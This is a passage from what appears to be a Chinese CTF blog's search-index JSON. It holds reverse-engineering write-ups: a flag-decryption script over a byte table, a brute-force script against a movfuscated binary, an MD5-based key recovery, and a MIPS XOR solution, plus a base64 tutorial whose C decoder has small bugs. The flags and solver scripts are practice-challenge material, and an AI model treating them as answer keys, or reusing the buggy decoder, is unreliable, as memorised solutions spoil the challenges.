0x86, 0x7b, 0x42, 0x53, 0x69, 0x05, 0x6b, 0xda, 0x34, 0x4b, 0xb3, 0xb2, 0x49, 0x2d, 0x9d, 0xab, 0xb9, 0xc8, 0x2b, 0x3f, 0xb3, 0x9d, 0x66, 0x71, 0xd0, 0x9f, 0xfc, 0x4e, 0xf0, 0xce, 0x4f, 0xac, 0x4e, 0x08, 0x2a, 0x23, 0xde, 0xa2, 0x1f, 0x2f, 0x21, 0xce, 0x73, 0x42, 0xb6, 0xf2, 0xef, 0x4b, 0x6e, 0x56, 0xf6, 0x35, 0xad, 0x2d, 0x61, 0x7d, 0x44, 0xcb, 0x61, 0x08, 0xaf, 0xd3, 0x94, 0x12, 0x7b, 0x61, 0x48, 0xde, 0x2e, 0xb8, 0x98, 0xf8, 0xc3, 0x66, 0xbc, 0x27, 0x31, 0x77, 0x33, 0x9f, 0xb7, 0x68, 0x39, 0xb8, 0x7c, 0x16, 0x76, 0x68, 0xa9, 0x58, 0x08, 0xe6, 0x07, 0xfb, 0xbd, 0xef, 0x27, 0xcd, 0x47, 0x71, 0xcd, 0xcb, 0x81, 0x48, 0x4b, 0xcc, 0xa5, 0x85, 0xd2, 0xda, 0xc9, 0x8c, 0x5c, 0x68, 0xc3, 0xa6, 0x83, 0x98, 0x6b, 0xee, 0x51, 0x8a, 0x65, 0x32, 0x94, 0x27, 0x11, 0x2c, 0x6d, 0xa3, 0x6a, 0xd3, 0xf6, 0xd5, 0xbb, 0x27, 0xba, 0x54, 0x1c, 0x92, 0xf7, 0xbf, 0x17, 0x7f, 0x7a, 0xa7, 0x01, 0x8b, 0x84, 0x56, 0x46, 0x13, 0xcf, 0x18, 0xd1, 0x60, 0xc8, 0x08, 0xe0, 0x3c, 0x63, 0x2f, 0x4f, 0xfa, 0xe8, 0x5c, 0x3b, 0xad, 0x5c, 0x45, 0x62, 0x3a, 0xd1, 0xbe, 0x75, 0x3d, 0x79, 0x26, 0xf0, 0xa2, 0x82, 0x23, 0xb8, 0x8c, 0xfe, 0xc7, 0x2a, 0x38, 0x03, 0xc1, 0x6d, 0x87, 0xfd, 0xba, 0x28, 0x55, 0x22, 0xe7, 0x4f, 0xb4, 0x33, 0xb7, 0x7d, 0x88, 0xae, 0x79, 0x4f, 0x87, 0x0f, 0xe3, 0x26, 0xd2, 0xe7, 0x4e, 0xc8, 0x69, 0xab, 0x8a, 0x15, 0x19, 0x95, 0xc3, 0x0d, 0x57, 0xd3, 0x5b, 0x67, 0x24, 0x10, 0x31, 0x35, 0x23, 0xa5, 0xdf, 0x0b, 0xc7, 0xd3, 0x20, 0x11, 0x8b, 0xb3, 0x09, 0xd3, 0x3c, 0x6b, 0x25, 0x80, 0xae, 0xcd, 0x50, 0x32, 0x19, 0xc0, 0x09, 0xa8, 0x52, 0x93, 0x0a, 0x78, 0x8f, 0x01, 0x0a, 0xd2, 0x24, 0x96, 0x52, 0x06, 0x2a, 0xbd, 0xd5, 0x71, 0x42, 0x5d, 0xb5, 0x23, 0x22, 0xba, 0xa5, 0x17, 0xab, 0xa0, 0xe3, 0x2b, 0xb5, 0x34, 0xcc, 0x83, 0x98, 0xac, 0x23, 0x92, 0xe7, 0x7f, 0x3b, 0x6b, 0x8a, 0x29, 0x8f, 0x44, 0x6d, 0x07, 0x67, 0xa7, 0xaa, 0x1b, 0x37, 0xe1, 0x2b, 0xe5, 0x39, 0x7e, 0x42, 0xeb, 0xfa, 0x2c, 0x09, 0x1d, 0x77, 0x95, 0xab, 0x3a, 0x41, 0x4b, 0xd2, 0x73, 0xaf, 0xe2, 0xc8, 0xa3, 0xea, 0xfe, 0xae, 0x69, 0x75, 0x3f, 0x54, 0x93, 0x40, 0x13, 0x7a, 0xc8, 0xea, 0x3b, 0x85, 0xd1, 0x82, 0xdd, 0x6b, 0x93, 0xad, 0xb1, 0x9a, 0xd5, 0x33, 0x8b, 0xd9, 0x3f, 0x40, 0x8e, 0x4e, 0xca, 0xf1, 0x74, 0x58, 0xfc, 0xd7, 0xa7, 0xc7, 0xbf, 0x6d, 0x61, 0x13, 0x9f, 0x64, 0x91, 0x1e, 0xc4, 0x00, 0x36, 0x3b, 0xb5, 0x66, 0xcf, 0xd6, 0xd0, 0x85, 0x1b, 0xdb, 0xb7, 0x94, 0x8f, 0xaf, 0x08, 0x2d, 0x28, 0xbd, 0xf9, 0x8c, 0x60, 0x6c, 0xc9, 0x93, 0x10, 0x0f, 0x0e, 0x73, 0x99, 0xfd, 0xda, 0x7e, 0xe0, 0xa1, 0xc4, 0xe8, 0xe6, 0x19, 0x65, 0x80, 0x98, 0xb3, 0xa7, 0xc1, 0x8e, 0x2c, 0xa4, 0x2b, 0xc5, 0xab, 0x6e, 0xad, 0x3b, 0xf5, 0xa6, 0xc1, 0x6d, 0x1d, 0x1a, 0xbd, 0x3e, 0xb8, 0xe5, 0xaa, 0x9a, 0x7d, 0xd4, 0x56, 0x0e, 0x12, 0x33, 0x8e, 0xbf, 0x18, 0x5b, 0x4b, 0x17, 0x66, 0x76, 0x3e, 0x01, 0xc7, 0x73, 0x07, 0xf8, 0x40, 0xd6, 0x93, 0x97, 0xb5, 0x31, 0x25, 0xd1, 0xaa, 0x00, 0xf9, 0x3c, 0x42, 0x93, 0x77, 0x54, 0x11, 0x54, 0x71, 0x2e, 0x09, 0x77, 0xe1, 0x10, 0x58, 0x53, 0xcf, 0xb3, 0xd2, 0xb2, 0x72, 0x60, 0x89, 0x18, 0xad, 0xfc, 0x09, 0xf5, 0xbc, 0x68, 0x01, 0xc2, 0xf9, 0x35, 0xe3, 0x7e, 0xb7, 0x5c, 0xe5, 0x3b, 0x9d, 0x01, 0x8c, 0xd5, 0x6b, 0x91, 0xea, 0x9f, 0x51, 0x29, 0xd6, 0xcd, 0x2e, 0x67, 0xe8, 0x19, 0x49, 0x27, 0xee, 0x12, 0xfc, 0x2f, 0x46, 0x0e, 0xf9, 0xca, 0x35, 0x54, 0x67, 0x08, 0xb6, 0xed, 0x06, 0x25, 0xff, 0x28, 0x7e, 0xca, 0x4d, 0xbd, 0x8c, 0x76, 0x7d, 0x23, 0x8d, 0xf4, 0xaf, 0x77, 0x6c, 0x46, 0x21, 0x64, 0xf2, 0x5f, 0x7a, 0x51, 0xa5, 0xcd, 0x87, 0xa8, 0xf4, 0x63, 0x81, 0x17, 0xdb, 0x21, 0x34, 0x8e, 0x3d, 0xb1, 0xdb, 0x96, 0x25, 0xff, 0xce, 0xae, 0x7d, 0xb5, 0xb8, 0x01, 0x90, 0xf4, 0x07, 0xcb, 0xfa, 0x50, 0xdb, 0xa8, 0xe3, 0xc9, 0x3f, 0xb4, 0x98, 0x53, 0xfe, 0x43, 0x8f, 0x2c, 0x9d, 0xb9, 0xf3, 0x92, 0x5d, 0x86, 0x3f, 0x8b, 0x82, 0xd0, 0x97, 0x32, 0xbf, 0x23, 0x86, 0xec, 0x3c, 0xf3, 0x56, 0x29, 0xd5, 0x5c, 0xeb, 0x50, 0x39, 0xb8, 0x88, 0x97, 0x70, 0xe3, 0xe0, 0xda, 0x3e, 0x61, 0x03, 0x1f, 0xc4, 0x26, 0x07, 0x6f, 0x00, 0x18, 0x89, 0x29, 0x0f, 0xf4, 0x08, 0xfd, 0x84, 0xba, 0x52, 0xf6, 0xab, 0x4a, 0xdf, 0x50, 0x6d, 0xb0, 0x5e, 0x5c, 0x6f, 0xd8, 0xb6, 0x0a, 0x9a, 0x42, 0x25, 0x75, 0xb2, 0x5e, 0x7c, 0x6a, 0x21, 0xd4, 0x63, 0xf0, 0xc6, 0xa1, 0x02, 0xec, 0x28, 0x1e, 0xcc, 0x73, 0x71, 0x75, 0xd5, 0x0f, 0x4f, 0xe1, 0xe4, 0x11, 0x24, 0x6b, 0x79, 0x7d, 0x12, 0xc7, 0xb3, 0xed, 0xed, 0x93, 0x98, 0x63, 0xff, 0x34, 0x6e, 0xfc, 0x36, 0x43, 0x83, 0x62, 0x9a, 0x64, 0x0a, 0xf3, 0x94, 0xe1, 0xc5, 0x00, 0xca, 0x01, 0x4b, 0xce, 0x3f, 0x48, 0xb7, 0x57, 0x69, 0x87, 0x9a, 0x82, 0xc8, 0xc4, 0xa8, 0xad, 0x2e, 0x68, 0xbf, 0x1e, 0x85, 0xb1, 0x83, 0x4f, 0x1d, 0x39, 0x8a, 0x36, 0x04, 0xdd, 0xdb, 0x06, 0x2f, 0xfa, 0xf6, 0xf7, 0xec, 0x7c, 0x16, 0x22, 0x17, 0x7b, 0x12, 0x28, 0xaa, 0xd8, 0x78, 0xe2, 0xf3, 0x23, 0x83, 0x1b, 0x6c, 0xcc, 0xd6, 0x3d, 0xa0, 0x99, 0x22, 0x3a, 0x85, 0xa8, 0x84, 0xd1, 0xba, 0x26, 0x1d, 0x70, 0x01, 0x34, 0x94, 0x3d, 0x1f, 0x0c, 0xc5, 0x12, 0xd8, 0xcc, 0x55, 0x74, 0xbe, 0xb3, 0xc3, 0x4b, 0xe5, 0x45, 0x3a, 0x46, 0x17, 0x2e, 0x5f, 0x43, 0xe5, 0x0f, 0x29, 0xa6, 0x39, 0x04, 0x5e, 0xea, 0x07, 0x1f, 0x10, 0xbb, 0x77, 0xb1, 0xd2, 0xb7, 0xbf, 0xda, 0x30, 0x3b, 0x7c, 0x14, 0x9e, 0x22, 0xa6, 0x29, 0xbd, 0xf2, 0xb4, 0xbf, 0xcc, 0x13, 0x79, 0xb2, 0xe7, 0xa0, 0x3c, 0x81, 0x33, 0xe1, 0xb8, 0x40, 0x95, 0x5b, 0xcd, 0x6e, 0x1e, 0xdb, 0x7e, 0x52, 0x77, 0xd1, 0xbc, 0x80, 0x31, 0x40, 0x86, 0x7a, 0xd7, 0xb6, 0x5b, 0x87, 0xe6, 0xe3, 0xc5, 0xbd, 0x30, 0x6b, 0x2e, 0xfa, 0x19, 0x7d, 0x41, 0xf1, 0x73, 0x90, 0xe6, 0x53, 0x58, 0x1a, 0x88, 0x48, 0x9a, 0x83, 0x83, 0x81, 0x25, 0xee, 0xdc, 0xdd, 0x11, 0xcd, 0x22, 0x66, 0x41, 0x84, 0x27, 0x65, 0xc6, 0x75, 0x8f, 0x78, 0x98, 0x36, 0x31, 0x30, 0x1b, 0xb4, 0xbd, 0x4b, 0xc1, 0x23, 0x73, 0x93, 0x00, 0x91, 0x8a, 0xd1, 0x39, 0x98, 0x27, 0x77, 0xc0, 0xfa, 0x21, 0x15, 0x17, 0xb3, 0xd6, 0x89, 0xdb, 0x7c, 0xe2, 0xea, 0x7a, 0x2b, 0xae, 0xa4, 0x1d, 0x24, 0x17, 0xd3, 0xd5, 0x4f, 0xec, 0x3c, 0x9b, 0x06, 0xa1, 0xfd, 0xd6, 0xcd, 0xad, 0x37, 0x95, 0xfa, 0x23, 0x77, 0x54, 0x64, 0x7c, 0x2f, 0x95, 0x02, 0x26, 0x6a, 0x4a, 0xaa, 0xfc, 0xe4, 0xf9, 0x49, 0xca, 0x27, 0xfd, 0xff, 0x10, 0xe2, 0xe1, 0xb4, 0xd9, 0x50, 0xc2, 0xc4, 0x89, 0xd6, 0x5c, 0x44, 0x68, 0xea, 0xd3, 0xbb, 0x4a, 0xd6, 0x33, 0x3e, 0x42, 0xb3, 0x23, 0x69, 0x05, 0x2a, 0x9b, 0x1d, 0xdc, 0x81, 0x1c, 0xa9, 0x8a, 0x47, 0x2f, 0x84, 0x3d, 0x4e, 0x84, 0x72, 0x50, 0xaf, 0x23, 0xf3, 0x63, 0xce, 0x26, 0xb3, 0xd6, 0xff, 0xb7, 0x9d, 0x16, 0x8d, 0x5c, 0x6d, 0xf7, 0x5c, 0x6e, 0x7b, 0x1d, 0x8e, 0x26, 0xc0, 0xfe, 0x8c, 0x2d, 0x8e, 0x5f, 0xc5, 0xa0, 0x90, 0xce, 0xf5, 0xa4, 0x08, 0x06, 0x0a, 0x9f, 0x34, 0xac, 0xda, 0xa0, 0xc7, 0x71, 0x2e, 0x12, 0x98, 0x00, 0x5c, 0x40, 0xdd, 0x1a, 0xe2, 0xc2, 0x59, 0x56, 0xf3, 0x5e, 0xe8, 0x64, 0x6f, 0x0d, 0xa2, 0xd5, 0x21, 0x50, 0x9c, 0x8b, 0x54, 0x88, 0x01, 0xa6, 0xa0, 0x58, 0x55, 0xf9, 0x57, 0xd2, 0x63, 0x13, 0x43, 0x97, 0xc3, 0x8a, 0xc1, 0xc8, 0xa2, 0xcc, 0xce, 0xc7, 0x8e, 0xbf, 0x1f, 0x58, 0x8f, 0x2a, 0x19, 0xbc, 0x6e, 0x07, 0x91, 0x50, 0x23, 0xeb, 0x25, 0xbc, 0x90, 0xcb, 0x88, 0x8a, 0xa2, 0x06, 0x8c, 0xc6, 0x30, 0xc7, 0xcc, 0x04, 0x93, 0xf6, 0xb4, 0x74, 0x52, 0x76, 0x86, 0x79, 0xc5, 0x60, 0x98, 0xdd, 0x29, 0x46, 0x4a, 0x4b, 0x10, 0x1d, 0x35, 0x81, 0xe7, 0x59, 0xe8, 0xa1, 0x90, 0xdd, 0x75, 0x5c, 0x36, 0xb1, 0x51, 0x22, 0xe2, 0xf7, 0xf8, 0xe8, 0xdb, 0xd9, 0x4a, 0xad, 0x08, 0xd9, 0x35, 0xf8, 0x00, 0xc4, 0x34, 0x39, 0x03, 0xc8, 0x37, 0xc5, 0x60, 0x3d, 0x25, 0x7e, 0x07, 0xbe, 0x25, 0x27, 0xb7, 0x86, 0x3a, 0x3a, 0x8c, 0xb2, 0xc1, 0xd4, 0x4e, 0xa9, 0x68, 0x15, 0x55, 0xb8, 0xbd, 0xba, 0xff, 0x0f, 0xd3, 0x63, 0x63, 0x9e, 0xed, 0x1e, 0x48, 0xab, 0x18, 0xea, 0x7d, 0xad, 0x38, 0xd2, 0xe9, 0x77, 0x1b, 0x4b, 0xdd, 0xd9, 0x78, 0x3c, 0x27, 0x47, 0xfd, 0x02, 0xad, 0xfe, 0x38, 0x45, 0xb5, 0xa0, 0xcc, 0x2a, 0xbd, 0xad, 0x5b, 0x53, 0xfd, 0xa5, 0x50, 0x42, 0x5d, 0x60, 0xe9, 0x51, 0x2c, 0x4a, 0x8d, 0x58, 0xd2, 0x2b, 0x41, 0x95, 0x69, 0x3c, 0xdd, 0xd1, 0xaa, 0x9f, 0xba, 0x41, 0x72, 0x40, 0x27, 0xc1, 0x7e, 0x38, 0xee, 0x51, 0xc2, 0x06, 0x61, 0x14, 0x3a, 0xc4, 0xbc, 0x4c, 0x58, 0x23, 0x42, 0xc0, 0x6e, 0x70, 0x2e, 0x36, 0x2f, 0x8e, 0xd5, 0x3e, 0x9b, 0x57, 0x7f, 0x7d, 0xd7, 0x1d, 0x6d, 0x56, 0x1b, 0x52, 0xe2, 0x5b, 0xf8, 0x99, 0xce, 0xae, 0xd8, 0x51, 0xfb, 0xa0, 0xb8, 0xa1, 0xe7, 0x03, 0x45, 0x0f, 0xcf, 0xea, 0xe8, 0x8a, 0x15, 0xac, 0x59, 0xc3, 0x91, 0x49, 0x7c, 0x83, 0xb0, 0x13, 0x43, 0x51, 0x49, 0x2c, 0xe4, 0x33, 0x0b, 0x84, 0xe8, 0x5b, 0x9e, 0x82, 0x95, 0x49, 0x1b, 0x76, 0x0b, 0x87, 0x56, 0x36, 0xbb, 0x2e, 0xdc, 0xe0, 0x13, 0xf1, 0xe1, 0x91, 0x11, 0x40, 0x46, 0xa3, 0x8e, 0x6b, 0x0b, 0xc2, 0x19, 0xe0, 0x2b, 0x32, 0x7c, 0x81, 0x22, 0x12, 0xe9, 0xe0, 0x58, 0x05, 0x08, 0x56, 0x46, 0x83, 0xd8, 0xb9, 0x9b, 0x3f, 0xbe, 0xc6, 0x3b, 0x43, 0x6f, 0x57, 0x17, 0x8e, 0xde, 0x21, 0x25, 0x9e, 0x2c, 0xd3, 0x10, 0xc2, 0x9b, 0x47, 0xaf, 0xb4, 0xd3, 0xdd, 0x05, 0xd8, 0x0c, 0xf2, 0x69, 0x9a, 0x33, 0xb1, 0xfd, 0x1e, 0xeb, 0x3f, 0x4c, 0x5b, 0xcd, 0x22, 0x38, 0xb5, 0x80, 0xc0, 0x88, 0xdd, 0x9a, 0xb5, 0xf6, 0xb5, 0x63, 0x13, 0x45, 0x70, 0xf4, 0xd8, 0x39, 0x59, 0x5e, 0xbe, 0x02, 0x0d, 0xb6, 0xc7, 0x43, 0x43, 0x4f, 0x49, 0xf1, 0xa6, 0x3c, 0xdd, 0x5f, 0xc1, 0xf9, 0x35, 0x2d, 0xa1, 0x97, 0xc7, 0x3f, 0xb6, 0xcd, 0x2f, 0x62, 0x45, 0x1f, 0xe0, 0x6d, 0x65, 0x5e, 0xfe, 0x8b, 0xf9, 0xb8, 0xe1, 0xce, 0xf7, 0xcb, 0xde, 0xd2, 0x55, 0x72, 0xa8, 0x26, 0xf2, 0x11, 0x2f, 0x75, 0xfa, 0x8c, 0x23, 0x60, 0xfd, 0x6f, 0x0e, 0xfd, 0xb3, 0xad, 0x88, 0x47, 0xb7, 0x6c, 0x49, 0xe7, 0x6b, 0x76, 0x4f, 0xfb, 0xf2, 0x5b, 0x94, 0x0f, 0xb4, 0x65, 0x70, 0x84, 0x99, 0xa2, 0x0e, 0x8f, 0xbe, 0x38, 0x09, 0x01, 0x9b, 0x9d, 0x1c, 0xd7, 0xbd, 0xcb, 0x74, 0x5f, 0xfb, 0x11, 0x9b, 0xf4, 0x62, 0x8a, 0xd6, 0xbf, 0xef, 0x94, 0x72, 0x86, 0x27, 0xcd, 0x2e, 0x36, 0x03, 0xfb, 0xdd, 0x32, 0xf4, 0x56, 0xc5, 0xd5, 0x4a, 0x68, 0x48, 0xc5, 0x28, 0x72, 0x61, 0x18, 0x10, 0xf3, 0x00, 0xa8, 0x1c, 0x45, 0xef, 0x6d, 0x07, 0xab, 0xde, 0x80, 0x4a, 0xca, 0xa3, 0xfc, 0x5a, 0x92, 0xe0, 0x78, 0x88, 0xc6, 0x4e, 0x36, 0xee, 0x4e, 0x28, 0x05, 0xb2, 0xf7, 0xf2, 0xac, 0xb8, 0x58, 0xf3, 0x99, 0x9d, 0x23, 0x8d, 0x41, 0x65, 0x9f, 0xeb, 0x76, 0xc0, 0x2e, 0xc6, 0x66, 0x52, 0x0e, 0x06, 0x6a, 0x38, 0x63, 0xda, 0x2f, 0x71, 0x1b, 0xe7, 0x73, 0x96, 0x8b, 0x91, 0x33, 0x4b, 0x7c, 0x46, 0xa0, 0x9d, 0x9d, 0x3c, 0xa0, 0x20, 0x66, 0x03, 0x2b, 0x1c, 0x14, 0xed, 0x53, 0x67, 0x20, 0xf7, 0xfe, 0xb5, 0xa0, 0x3b, 0x59, 0xee, 0x90, 0x02, 0xfb, 0x9a, 0x05, 0x47, 0xdc, 0xc6, 0x98, 0xea, 0xca, 0xd7, 0x09, 0x69, 0x70, 0x59, 0xb4, 0x68, 0x3c, 0xc2, 0xb6, 0x5f, 0x63, 0xea, 0x62, 0x6f, 0x6b, 0xac, 0x22, 0xad, 0xb8, 0x2b, 0x36, 0x3b, 0x2b, 0xb7, 0xb8, 0x75, 0xcb, 0xcd, 0xd5, 0x3b, 0x79, 0xc7, 0x19, 0x4b, 0xf1, 0xa9, 0xb1, 0xd5, 0xc4, 0x59, 0x57, 0xad, 0x5a, 0xa8, 0x28, 0x8e, 0xd7, 0x1e, 0x92, 0x6c, 0x01, 0x85, 0x13, 0x51, 0x62, 0x81, 0x65, 0xea, 0x84, 0x57, 0x6f, 0x97, 0xb6, 0x0a, 0x37, 0xe0, 0x1d, 0x1e, 0x80, 0x04, 0x34, 0xc7, 0x7d, 0xba, 0x74, 0x40, 0xd4, 0x6a, 0x72, 0xc2, 0xa1, 0x96, 0x3a, 0xf8, 0x5a, 0x9d, 0xa0, 0x50, 0xc3, 0x27, 0xf9, 0x96, 0x7f, 0x88, 0x41, 0x13, 0xe7, 0xab, 0xac, 0x7e, 0x77, 0xe2, 0x94, 0x67, 0x41, 0x11, 0x0d, 0xfb, 0xf2, 0x73, 0xda, 0x18, 0x2f, 0x1c, 0xd5, 0x6b, 0xec, 0xde, 0x96, 0x4b, 0x83, 0x1a, 0xd6, 0xf3, 0x10, 0x9a, 0x4b, 0x8e, 0xbb, 0x2e, 0x74, 0x6d, 0x97, 0x0a, 0xce, 0xc8, 0xc4, 0xfa, 0x4a, 0xac, 0xb4, 0x6e, 0xde, 0xac, 0x58, 0xd2, 0xe1, 0x62, 0x38, 0x99, 0xab, 0x92, 0xae, 0xbd, 0x84, 0x52, 0x7d, 0x38, 0xfe, 0xaa, 0x6e, 0x14, 0x04, 0xa3, 0xb1, 0x72, 0xcb, 0x55, 0x97, 0x91, 0xf8, 0x31, 0x7e, 0xa9, 0x75, 0x13, 0xc0, 0xf9, 0xe2, 0x22, 0x63, 0x8f, 0xd2, 0x68, 0x3a, 0x97, 0xd7, 0x9e, 0x5b, 0xb9, 0xde, 0xb8, 0x94, 0xa8, 0xaa, 0x34, 0x25, 0xf2, 0xc6, 0xc6, 0x81, 0xee, 0xc8, 0x39, 0x40, 0x2b, 0x74, 0xe5, 0x52, 0x2a, 0xb9, 0x21, 0x92, 0xe8, 0x64, 0x4e, 0x24, 0x90, 0xda, 0xd7, 0xdb, 0x67, 0x63, 0xa4, 0x8e, 0x03, 0x95, 0xd7, 0x2c, 0x87, 0x95, 0x50, 0x97, 0x8e, 0x27, 0xcc, 0x3b, 0xc7, 0x6b, 0x8e, 0x96, 0x69, 0x49, 0x07, 0x1c, 0xd1, 0x6a, 0x8e, 0x2a, 0x61, 0x26, 0xa0]\nfb = [1,1]\n\n#x = 2136772529\ny = 1234567890\nx = 4284256177\ndef what(a1):\n    num = fb[-1] + fb[-2]\n    fb.append(num)\n    return num\n\ndef calc_key(a1, a2):\n    i = 3\n    while (i <= 9999998):\n        if(what(i) & 0xffffffff == a1):\n            return a2*i+1\n        i += 1\n\ndef decrypt_flag(a1, a2, key):\n    flag = ''\n    while(a2):\n        flag +=chr((junk_data[a1&0xFFF]^a2)&0x7f)\n        a1 = (a1*77777)&0xffffffff\n        a2 = (key^(a2>>1))&0xffffffff\n        key >>= 1\n    return flag\n\nKEY = calc_key(x,y)&0xffffffff\nprint(decrypt_flag(x,y,KEY))\n```\n\n\n\n### mov\n\n此题为`movfuscator`，打开全是mov指令。\n\n可爆破得出flag\n\n```python\nimport subprocess\nimport string\nbaopo = lambda :subprocess.Popen('./mov', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)\nflag = \"F\"\nwhile flag[-1] != '}':\n\tfor i in string.printable:\n\t\tp = baopo()\n\t\tp.stdin.write(flag + i)\n\t\tif 'Good' in p.stdout.read():\n\t\t\tflag += i\n\t\t\tbreak \nprint flag\n```\n\n","tags":["Writeups"]},{"title":"cumtfinal","url":"/2019/09/29/cumtfinal/","content":"\n","tags":["-CTF"]},{"title":"base64编码原理理解","url":"/2019/09/11/base64/","content":"\n- 编码\n\n  1、取待编码字符串前3位（8bit/位），转换为二进制的ascii编码（共24bit）。\n\n  2、将转换后的二进制编码按每6位分为4块，将每块二进制转换成ascii码值\n\n  3、对照base64解码表即可得到对应的base64编码\n\n  4、若取不到3位待编码字符串则用0补充，划分区间后全0的块用‘=’代替\n\n  ![nw4fN6.png](https://s2.ax1x.com/2019/09/11/nw4fN6.png)\n\n- 解码\n\n  1、取待解码字符串前4位（8bit/位），对照base64编码表，转换为映射的数字，并将每一个数转成6位二进制数（共24bit），\n\n  2、将24位二进制分为3份8bit数据\n\n  3、对照ascii码表转换对应字符，解码完成\n\n  4、在第一步中若有‘=’字符则将其转为000000\n\n  ![Q2PWVJ.png](https://s2.ax1x.com/2019/12/13/Q2PWVJ.png)\n\n附base64编码对照表\n\n![nw4Hud.png](https://s2.ax1x.com/2019/09/11/nw4Hud.png)\n\n## base64_decode\n\n```c\nconst char * base64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";//可以自己定制，比如说把+和/改成-和_以满足url编码的要求。\nint base64_decode( const char * base64, unsigned char * bindata )\n{\n    int i, j;\n    unsigned char k;\n    unsigned char t;\n    unsigned char temp[4];\n    for ( i = 0, j = 0; base64[i] != '\\0' ; i += 4 )//每四个字节为一组\n    {\n        memset( temp, 0xFF, sizeof(temp) );\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i] )\n                temp[0]= k;//获取一组中每个字节对应的编号\n        }\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i+1] )\n                temp[1]= k;\n        }\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i+2] )\n                temp[2]= k;\n        }\n        for ( k = 0 ; k < 64 ; k ++ )\n        {\n            if ( base64char[k] == base64[i+3] )\n                temp[3]= k;\n        }\n\n        bindata[j++] = ((unsigned char)(((unsigned char)(temp[0] << 2))&0xFC)) |((unsigned char)((unsigned char)(temp[1]>>4)&0x03));//这些就是补0补位的操作了\n\n        if ( base64[i+2] == '=' )\n            break;\n\n        bindata[j++] = ((unsigned char)(((unsigned char)(temp[1] << 4))&0xF0)) | ((unsigned char)((unsigned char)(temp[2]>>2)&0x0F));\n\n        if ( base64[i+3] == '=' )\n            break;\n\n        bindata[j++] = ((unsigned char)(((unsigned char)(temp[2] << 6))&0xF0)) |((unsigned char)(temp[3]&0x3F));\n\n    }\n    return j;\n}\n```\n\n## base64_encode\n\n```c\nchar * base64_encode( const unsigned char * bindata, char * base64, int binlength )\n{\n    int i, j;\n    unsigned char current;\n\n    for ( i = 0, j = 0 ; i < binlength ; i += 3 )\n    {\n        current = (bindata[i] >> 2) ;\n        current &= (unsigned char)0x3F;\n        base64[j++] = base64char[(int)current];\n\n        current = ( (unsigned char)(bindata[i] << 4 ) ) & ( (unsigned char)0x30 ) ;\n        if ( i + 1 >= binlength )\n        {\n            base64[j++] = base64char[(int)current];\n            base64[j++] = '=';\n            base64[j++] = '=';\n            break;\n        }\n        current |= ( (unsigned char)(bindata[i+1] >> 4) ) & ( (unsigned char) 0x0F );\n        base64[j++] = base64char[(int)current];\n\n        current = ( (unsigned char)(bindata[i+1] << 2) ) & ( (unsigned char)0x3C ) ;\n        if ( i + 2 >= binlength )\n        {\n            base64[j++] = base64char[(int)current];\n            base64[j++] = '=';\n            break;\n        }\n        current |= ( (unsigned char)(bindata[i+2] >> 6) ) & ( (unsigned char) 0x03 );\n        base64[j++] = base64char[(int)current];\n\n        current = ( (unsigned char)bindata[i+2] ) & ( (unsigned char)0x3F ) ;\n        base64[j++] = base64char[(int)current];\n    }\n    base64[j] = '\\0';\n    return base64;\n}\n```\n\n\n\n \n\n","tags":["算法分析"]},{"title":"攻防世界 RE进阶区 WriteUps","url":"/2019/09/11/XCTF RE 进阶区1-6/","content":"\n本文持续更新\n\n## 0x01 dmd-50\n\n下载附件发现为ELF文件，在Linux中运行\n\n![ndz8Wd.png](https://s2.ax1x.com/2019/09/11/ndz8Wd.png)\n\n需要输入key，猜测为flag，拖入64位ida中查看源码，F5反汇编查看main函数C伪码\n\n![ndzwTS.png](https://s2.ax1x.com/2019/09/11/ndzwTS.png)\n\nif不成立的话则输出The Key is valid ! :）\n\n![ndzDYQ.png](https://s2.ax1x.com/2019/09/11/ndzDYQ.png)\n\n主函数发现md5函数，双击跟进查看\n\n![ndz6ln.png](https://s2.ax1x.com/2019/09/11/ndz6ln.png)\n\nmd5函数中，对字符串v40进行md5加密并返回\n\n[![ndzcyq.png](https://s2.ax1x.com/2019/09/11/ndzcyq.png)](https://imgchr.com/i/ndzcyq)\n\n提取if语句中的值进行md5解密\n\n![ndzWwT.png](https://s2.ax1x.com/2019/09/11/ndzWwT.png)\n\n在Linux中输入解密结果grape\n\n![ndz5Y4.png](https://s2.ax1x.com/2019/09/11/ndz5Y4.png)\n\n仍是无法通过，查看发现解密网站对字符串进行了md5(md5($pass))解密。重新载入对提取串进行一次md5解密得到 b781cbb29054db12f88f08c6e161c199，输入Linux中得到正确结果\n\n![ndzbOx.png](https://s2.ax1x.com/2019/09/11/ndzbOx.png)\n\nflag： b781cbb29054db12f88f08c6e161c199\n\n\n\n## 0x02 Shuffle\n\n根据题目提示和在Linux中的运行结果，猜测程序对flag进行随机化打乱\n\n![ndzXTO.png](https://s2.ax1x.com/2019/09/11/ndzXTO.png)\n\n![ndzxte.png](https://s2.ax1x.com/2019/09/11/ndzxte.png)\n\n载入IDA查看源码，发现在程序输出前存在rand函数\n\n![nwSk0f.png](https://s2.ax1x.com/2019/09/11/nwSk0f.png)\n\n提取rand前的数据转换成ascii码\n\n![nwSA78.png](https://s2.ax1x.com/2019/09/11/nwSA78.png)\n\n![nwSZtg.png](https://s2.ax1x.com/2019/09/11/nwSZtg.png)\n\n即可得到flag\n\n\n\n## 0x03 re-for-50-plz-50\n\n\n\nLinux中无法运行，直接载入ida32，发现代码为为**MIPS指令集**，ida无法直接反出伪代码\n\n![nwSln0.png](https://s2.ax1x.com/2019/09/11/nwSln0.png)\n\n简单了解了一下[MIPS指令集](<https://www.cnblogs.com/thoupin/p/4018455.html>)\n\n![nwS37T.png](https://s2.ax1x.com/2019/09/11/nwS37T.png)\n\n猜测异或算法\n\n```python\na = \"cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ\"\na_list = list(a)\t\t\t\t\t\t#将字符串a拆分为列表可通过下标访问\nflag = ''\n\nfor i in a_list:\n    flag += chr(ord(i) ^ 0x37)\n\nprint(flag)\n```\n\n得到flag： TUCTF{but_really_whoisjohngalt}\n\n后续通过得知，可通过安装ida插件**Retdec**对MIPS指令集进行反汇编得出伪码\n\n\n\n## 0x04 